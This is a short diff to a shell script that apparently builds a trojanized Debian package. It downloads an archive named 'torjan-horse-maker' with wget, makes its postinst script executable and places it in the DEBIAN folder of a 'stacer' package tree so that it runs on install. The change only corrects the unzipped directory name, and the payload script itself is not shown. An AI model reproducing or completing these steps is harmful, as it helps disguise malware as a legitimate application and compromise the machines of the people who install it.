@@ -4,7 +4,7 @@ cd stacer_1.1.0_amd64/
 mkdir DEBIAN
 wget https://github.com/3r0-r/torjan-horse-maker/archive/main.zip
 unzip main.zip
-cd torjan-horse-maker
+cd torjan-horse-maker-main
 chmod 755 postinst
 mv control postinst ~/Desktop/torjan-horse-maker/stacer_1.1.0_amd64/DEBIAN
 cd ..
